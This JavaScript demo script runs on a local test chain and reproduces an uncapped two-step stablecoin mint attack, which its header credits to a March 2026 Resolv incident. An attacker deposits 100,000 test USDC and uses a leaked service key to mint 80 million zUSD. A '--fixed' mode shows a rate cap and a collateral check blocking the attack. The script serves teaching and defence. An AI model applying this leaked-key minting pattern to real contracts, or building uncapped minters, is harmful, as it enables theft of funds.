// Attack #1: the uncapped two-step mint (the Resolv pattern, March 2026).
//   node demos/01-mint.mjs           the service key mints whatever it likes
//   node demos/01-mint.mjs --fixed   1,000,000 zUSD/hour cap, and mint <= collateral in
import { startChain, stopChain, setup, roles, abis, send, attempt, read, fmt, parseUnits } from "../lib/chain.mjs";
import { session } from "../lib/term.mjs";

const fixed = process.argv.includes("--fixed");
const t = session(fixed ? "mint-fixed" : "mint", fixed ? "Uncapped mint, fixed" : "Uncapped mint");
await startChain();
const s = await setup({ fixed, minter: "contract" });
const u = (n) => parseUnits(String(n), 6);
const zBal = (a) => read(s.zusd, s.tokenAbi, "balanceOf", [a]);

// The attacker deposits like any user: requestSwap(100,000 tUSDC).
await send(roles.attacker, s.usdc, abis.usdc, "mint", [roles.attacker.address, u(100_000)]);
await send(roles.attacker, s.usdc, abis.usdc, "approve", [s.minter, u(100_000)]);
t.cmd("minter.requestSwap(100,000 tUSDC)");
await send(roles.attacker, s.minter, s.minterAbi, "requestSwap", [u(100_000)]);
const collateralIn = await read(s.usdc, abis.usdc, "balanceOf", [s.minter]);
t.note(`request #0: ${fmt(collateralIn)} tUSDC deposited`);
t.warn("SERVICE_KEY leaked   # one key, completes every swap");

t.cmd("minter.completeSwap(0, 80,000,000 zUSD)   # signed with the leaked key");
const big = await attempt(roles.service, s.minter, s.minterAbi, "completeSwap", [0n, u(80_000_000)]);
if (big.ok) t.bad(`  ✓ minted ${fmt(await zBal(roles.attacker.address))} zUSD to the attacker`);
else {
  t.ok(`  ✗ reverted: ${big.name}(${fmt(big.args[0])} > ${fmt(big.args[1])} per hour)`);
  t.cmd("minter.completeSwap(0, 900,000 zUSD)   # under the cap");
  const mid = await attempt(roles.service, s.minter, s.minterAbi, "completeSwap", [0n, u(900_000)]);
  t.ok(`  ✗ reverted: ${mid.name}(collateral ${fmt(mid.args[0])} < mint ${fmt(mid.args[1])})`);
  t.cmd("minter.completeSwap(0, 100,000 zUSD)");
  const fair = await attempt(roles.service, s.minter, s.minterAbi, "completeSwap", [0n, u(100_000)]);
  t.note(fair.ok ? "  ✓ minted 1:1 against the deposit" : `  ✗ ${fair.name}`);
}
t.say("");
t.big(`MINTED: ${fmt(await zBal(roles.attacker.address))} zUSD   COLLATERAL IN: ${fmt(collateralIn)} tUSDC`);
t.save(); stopChain(); process.exit(0);
